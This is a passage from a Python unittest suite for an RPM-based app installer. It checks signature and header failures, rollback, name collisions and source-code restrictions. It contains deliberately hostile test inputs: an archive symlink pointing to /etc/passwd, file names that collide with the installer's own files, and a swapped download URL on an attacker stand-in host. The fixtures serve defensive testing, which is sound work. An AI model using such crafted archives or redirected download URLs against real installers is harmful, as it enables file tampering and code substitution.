                         "no staging or previous folder is left in ~/Applications")
        self.assertEqual(sorted(p.name for p in self.records().iterdir()), ["app.json"] if installed else [])
        downloads = self.home / ".cache/moos-store/downloads"
        self.assertEqual(list(downloads.iterdir()), [], "the private work folder is always removed")

    def test_install_then_update(self):
        record, stages, opener = self.install("2.0", app_payload(b"v2"))
        self.assertEqual(list(dict.fromkeys(stages)), list(vendor.STAGES))
        # Nothing measures rpm2cpio writing the payload out: unpacking starts indeterminate.
        self.assertEqual(next(report for report in self.reports if report[0] == "extracting"),
                         ("extracting", None))
        app = self.apps() / "app"
        self.assertTrue((app / "App").read_bytes().endswith(b"v2"))
        self.assertEqual((app / ".moos-icon.png").read_bytes(), PNG)
        self.assertEqual((app / ".moos-vendor").read_text(), "app\n")
        self.assertEqual(sorted(p.name for p in app.iterdir()),
                         [".moos-icon.png", ".moos-vendor", "App", "app-launcher", "chrome-sandbox", "resources"])
        text = self.launcher().read_text()
        self.assertIn(f'Exec="{app}/App" %U', text)
        self.assertIn(f"Icon={app}/.moos-icon.png", text)
        self.assertIn("Name=App Studio", text)
        self.assertIn("MimeType=x-scheme-handler/appx;", text)
        self.assertNotIn("sh -c", text)
        self.assertEqual((record["version"], record["release"], record["sandbox"], record["signature"]),
                         ("2.0", "1", "namespace", "RSA/SHA512"))
        self.assertEqual(record["stripped"], ["chrome-sandbox"])
        self.assertEqual((record["desktop"], record["directory"]), ("org.moos.vendor.app.desktop", str(app)))
        self.assertEqual(vendor.installed("app")["sha256"], record["sha256"])
        self.assertTrue(all(url.startswith("https://") for url in opener.requests))
        self.assertClean()
        self.assertFalse(vendor.update_available("app", record))

        newer, _stages, _opener = self.install("2.1", app_payload(b"v21"))
        self.assertFalse(vendor.update_available("app", {"epoch": 0, "version": "2.1", "release": "1"}))
        self.assertTrue((app / "App").read_bytes().endswith(b"v21"))
        self.assertEqual(newer["version"], "2.1")
        self.assertClean()

    def test_a_failed_update_keeps_the_version_that_worked(self):
        self.install("2.0", app_payload(b"v2"))
        before_launcher = self.launcher().read_bytes()
        before_record = (self.records() / "app.json").read_bytes()
        failures = {
            "signature": dict(tools=Tools(checksig=CHECKSIG_NOKEY, status=1,
                                          header=("app", "0", "2.1", "1", "x86_64", "cpio"))),
            "header": dict(tools=Tools(header=("app", "0", "2.0", "1", "x86_64", "cpio"))),
        }
        for label, kwargs in failures.items():
            with self.subTest(label), self.assertRaises(vendor.VendorError):
                self.install("2.1", app_payload(b"v21"), **kwargs)
            self.assertTrue((self.apps() / "app/App").read_bytes().endswith(b"v2"))
            self.assertEqual(self.launcher().read_bytes(), before_launcher)
            self.assertEqual((self.records() / "app.json").read_bytes(), before_record)
            self.assertClean()
        hostile = {
            "a link out": [{"name": "./usr/lib/app", "mode": DIR},
                           {"name": "./usr/lib/app/x", "mode": LNK, "data": b"/etc/passwd"}],
            "the marker's name": [{"name": "./usr/lib/app", "mode": DIR},
                                  {"name": "./usr/lib/app/.moos-vendor", "mode": REG, "data": b"app\n"}],
            "the icon's name": [{"name": "./usr/lib/app", "mode": DIR},
                                {"name": "./usr/lib/app/App", "mode": EXE, "data": CHROMIUM_ELF},
                                {"name": "./usr/lib/app/.moos-icon.png", "mode": REG, "data": PNG},
                                {"name": "./usr/share/pixmaps/app.png", "mode": REG, "data": PNG}],
        }
        for label, entries in hostile.items():
            with self.subTest(label), self.assertRaises(vendor.VendorError) as caught:
                self.install("2.1", newc(entries))
            self.assertEqual(caught.exception.code, "unsafe_archive")
            self.assertTrue((self.apps() / "app/App").read_bytes().endswith(b"v2"))
            self.assertEqual(self.launcher().read_bytes(), before_launcher)
            self.assertClean()

    def test_a_failure_after_the_swap_restores_everything(self):
        self.install("2.0", app_payload(b"v2"))
        before_launcher = self.launcher().read_bytes()
        original = vendor._write_atomic

        def failing(path, data, mode):
            if path.name == "app.json":
                raise OSError("disk full")
            return original(path, data, mode)

        vendor._write_atomic = failing
        try:
            with self.assertRaises(OSError):
                self.install("2.1", app_payload(b"v21"))
        finally:
            vendor._write_atomic = original
        self.assertTrue((self.apps() / "app/App").read_bytes().endswith(b"v2"))
        self.assertEqual(self.launcher().read_bytes(), before_launcher)
        self.assertClean()

    def test_a_failed_first_install_leaves_nothing(self):
        original = vendor._write_atomic

        def failing(path, data, mode):
            if path.name == "app.json":
                raise OSError("disk full")
            return original(path, data, mode)

        vendor._write_atomic = failing
        try:
            with self.assertRaises(OSError):
                self.install("2.0", app_payload(b"v2"))
        finally:
            vendor._write_atomic = original
        self.assertFalse(self.launcher().exists())
        self.assertClean(installed=False)

    def test_refused_before_downloading_when_something_else_is_in_the_way(self):
        opener, _ = self.serve("2.0", app_payload())
        self.launcher().parent.mkdir(parents=True)
        self.launcher().write_text("[Desktop Entry]\nName=Someone else's\n")
        self.assertCode("name_taken", vendor.install, "app", ENTRY, arch="x86_64", opener=opener, run=Tools(),
                        convert=self.convert, refresh_menu=False, proc_sys=self.proc_sys())
        self.launcher().unlink()
        dropped = self.apps() / "app"                            # an App Drop app with the same name
        (dropped / "bin").mkdir(parents=True)
        self.assertCode("name_taken", vendor.install, "app", ENTRY, arch="x86_64", opener=opener, run=Tools(),
                        convert=self.convert, refresh_menu=False, proc_sys=self.proc_sys())
        self.assertEqual(opener.requests, [])
        self.assertTrue((dropped / "bin").is_dir())
        self.assertFalse(self.launcher().exists())

    def test_a_program_that_could_not_start_its_sandbox_is_not_installed(self):
        opener, _ = self.serve("2.0", app_payload())
        self.assertCode("sandbox_unavailable", vendor.install, "app", ENTRY, arch="x86_64", opener=opener,
                        run=Tools(header=("app", "0", "2.0", "1", "x86_64", "cpio")), convert=self.convert,
                        refresh_menu=False, proc_sys=self.proc_sys("0"))
        self.assertFalse(self.launcher().exists())
        self.assertClean(installed=False)

    def test_a_resolved_info_from_elsewhere_is_rechecked(self):
        opener, _ = self.serve("2.0", app_payload())
        info = vendor.resolve(ENTRY, "x86_64", opener=opener)
        for change in ({"url": "https://evil.example/app.rpm"}, {"name": "other"}, {"arch": "aarch64"},
                       {"url": "http://packages.example.com/linux/rpm/x86_64/app.rpm"}):
            with self.subTest(change=change), self.assertRaises(vendor.VendorError):
                vendor.install("app", ENTRY, arch="x86_64", info={**info, **change}, opener=opener, run=Tools(),
                               convert=self.convert, refresh_menu=False, proc_sys=self.proc_sys())


# ── the module's own promises ────────────────────────────────────────────────
class Source(unittest.TestCase):
    SOURCE = MODULE.read_text(encoding="utf-8")
    TREE = ast.parse(SOURCE)

    # Where each helper takes the code it raises: (positional index, keyword name).
    CODE_ARGUMENTS = {"VendorError": (0, "code"), "_check_https_url": (1, "code"), "_read_capped": (2, "too_large"),
                      "_tool": (None, "failure"), "_payload_path": (2, "code")}

    def test_every_error_code_is_declared_and_raised(self):
        used: set[str] = set()
        for node in ast.walk(self.TREE):
            if not isinstance(node, ast.Call):
                continue
            name = node.func.id if isinstance(node.func, ast.Name) else getattr(node.func, "attr", "")
            if name not in self.CODE_ARGUMENTS:
                continue
            position, keyword = self.CODE_ARGUMENTS[name]
            values = [item.value for item in node.keywords if item.arg == keyword]
            if position is not None and len(node.args) > position:
                values.append(node.args[position])
            for value in values:
                if isinstance(value, ast.Constant) and isinstance(value.value, str):
                    used.add(value.value)
        self.assertEqual(sorted(used - vendor.ERROR_CODES), [], "a raised code the Store has no words for")
        self.assertEqual(sorted(vendor.ERROR_CODES - used), [], "a declared code nothing raises")

    def test_only_the_image_s_fixed_tools_are_ever_run(self):
        self.assertNotIn("shell=", self.SOURCE)
        self.assertNotIn("os.system", self.SOURCE)
        self.assertNotIn("os.exec", self.SOURCE)
        tools = set()
        for node in ast.walk(self.TREE):
            if isinstance(node, ast.Call) and getattr(node.func, "attr", getattr(node.func, "id", "")) in (
                    "Popen", "_tool"):
                argv = node.args[0] if getattr(node.func, "attr", "") == "Popen" else node.args[1]
                self.assertIsInstance(argv, ast.List, ast.dump(node)[:120])
                tools.add(argv.elts[0].id)
        self.assertEqual(tools, {"RPM", "RPMKEYS", "RPM2CPIO"})
        self.assertEqual((vendor.RPM, vendor.RPMKEYS, vendor.RPM2CPIO),
                         ("/usr/bin/rpm", "/usr/bin/rpmkeys", "/usr/bin/rpm2cpio"))

    def test_no_user_visible_words_and_no_engine_names(self):
        for word in ("Fedora", "Red Hat", "moos://", "pkexec", "sudo", "rpm-ostree"):
            self.assertNotIn(word, self.SOURCE)

    def test_registered_in_the_gates(self):
        line = "python3 tests/test_moos_vendor_rpm.py"
        for gate in ("Justfile", "tests/repo-gates.sh"):
            self.assertTrue(line in (ROOT / gate).read_text(encoding="utf-8"), f"{gate} does not run this gate")


if __name__ == "__main__":
    unittest.main(verbosity=1)
